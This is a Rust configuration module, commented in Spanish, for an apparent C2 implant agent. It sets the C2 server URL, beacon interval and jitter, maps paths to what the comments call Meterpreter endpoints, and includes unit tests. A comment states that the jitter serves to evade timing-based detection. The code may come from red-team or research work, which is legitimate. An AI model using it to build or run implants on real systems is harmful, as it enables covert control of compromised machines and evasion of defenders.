//! # Configuración del Agente
//!
//! Este módulo define la configuración del agente C2, incluyendo:
//! - URL del servidor C2
//! - Intervalo de beaconing (sleep)
//! - Porcentaje de jitter para variación aleatoria
//!
//! ## Estructura de Configuración
//!
//! ```text
//! AgentConfig {
//!     url: "http://c2server:8080/register",  // URL del C2
//!     sleep: Duration::from_secs(5),         // Beacon cada 5 segundos
//!     jitter_pct: 20,                        // ±20% de variación
//! }
//! ```
//!
//! ## Normalización de URLs
//!
//! La función `normalize_url` convierte URLs comunes a los paths internos
//! del protocolo Meterpreter:
//!
//! | URL de entrada | URL normalizada |
//! |----------------|-----------------|
//! | `/register` | `/mp/result` |
//! | `/checkin` | `/mp/checkin` |
//! | `/result` | `/mp/result` |
//!
//! Esto permite compatibilidad con diferentes convenciones de URL del C2.

use core::time::Duration;

/// Configuración del agente C2.
///
/// Contiene todos los parámetros necesarios para el funcionamiento
/// del agente, incluyendo conexión y comportamiento de beaconing.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct AgentConfig {
    /// URL del servidor C2.
    ///
    /// Puede incluir paths como `/register`, `/checkin` que serán
    /// normalizados a los paths del protocolo Meterpreter.
    pub url: String,
    
    /// Intervalo de beaconing (tiempo entre checkins).
    ///
    /// El agente duerme este tiempo entre cada comunicación con el C2.
    /// Valores típicos: 1-60 segundos.
    pub sleep: Duration,
    
    /// Porcentaje de jitter para variación aleatoria del sleep.
    ///
    /// Si jitter_pct = 20 y sleep = 5s:
    /// - El sleep real estará entre 4s y 6s (±20%)
    /// - Esto ayuda a evadir detección por patrones de tiempo fijos
    ///
    /// Rango válido: 0-100 (0 = sin jitter, 100 = ±100%)
    pub jitter_pct: u8,
}

impl AgentConfig {
    /// Crea una nueva configuración con valores por defecto.
    ///
    /// ## Argumentos
    ///
    /// - `url`: URL del servidor C2
    ///
    /// ## Valores por defecto
    ///
    /// - `sleep`: 300ms (beaconing rápido para pruebas)
    /// - `jitter_pct`: 0 (sin variación)
    ///
    /// ## Ejemplo
    ///
    /// ```rust
    /// let cfg = AgentConfig::new("http://127.0.0.1:8080/register".to_string());
    /// assert_eq!(cfg.sleep, Duration::from_millis(300));
    /// ```
    pub fn new(url: String) -> Self {
        Self {
            url,
            sleep: Duration::from_millis(300),
            jitter_pct: 0,
        }
    }

    /// Retorna la URL normalizada para uso interno.
    ///
    /// Convierte paths comunes a los paths del protocolo Meterpreter.
    pub fn normalized_url(&self) -> String {
        normalize_url(&self.url)
    }
}

/// Normaliza una URL del C2 a los paths del protocolo Meterpreter.
///
/// ## Conversiones
///
/// | Sufijo de entrada | Sufijo de salida |
/// |-------------------|------------------|
/// | `/register` | `/mp/result` |
/// | `/checkin` | `/mp/checkin` |
/// | `/result` | `/mp/result` |
/// | `/mp/*` | Sin cambios |
///
/// ## Argumentos
///
/// - `url`: URL a normalizar
///
/// ## Retorna
///
/// URL normalizada con los paths correctos del protocolo.
///
/// ## Propósito
///
/// El protocolo Meterpreter usa paths específicos:
/// - `/mp/checkin`: Endpoint para checkin del agente
/// - `/mp/result`: Endpoint para enviar resultados
///
/// Esta función permite configurar el agente con URLs más intuitivas
/// que se convierten automáticamente a los paths internos.
pub fn normalize_url(url: &str) -> String {
    let mut s = url.trim().to_string();
    if s.ends_with("/register") {
        s.truncate(s.len() - "/register".len());
        s.push_str("/mp/result");
    } else if s.ends_with("/checkin") {
        s.truncate(s.len() - "/checkin".len());
        s.push_str("/mp/checkin");
    } else if s.ends_with("/result") && !s.contains("/mp/") {
        s.truncate(s.len() - "/result".len());
        s.push_str("/mp/result");
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn normalize_url_register_to_mp_result() {
        assert_eq!(
            normalize_url("http://127.0.0.1:8080/register"),
            "http://127.0.0.1:8080/mp/result"
        );
    }

    #[test]
    fn normalize_url_checkin_to_mp_checkin() {
        assert_eq!(
            normalize_url("http://127.0.0.1:8080/checkin"),
            "http://127.0.0.1:8080/mp/checkin"
        );
    }

    #[test]
    fn normalize_url_result_to_mp_result() {
        assert_eq!(
            normalize_url("http://127.0.0.1:8080/result"),
            "http://127.0.0.1:8080/mp/result"
        );
    }

    #[test]
    fn normalize_url_keeps_mp_paths() {
        assert_eq!(
            normalize_url("http://127.0.0.1:8080/mp/result"),
            "http://127.0.0.1:8080/mp/result"
        );
    }
}
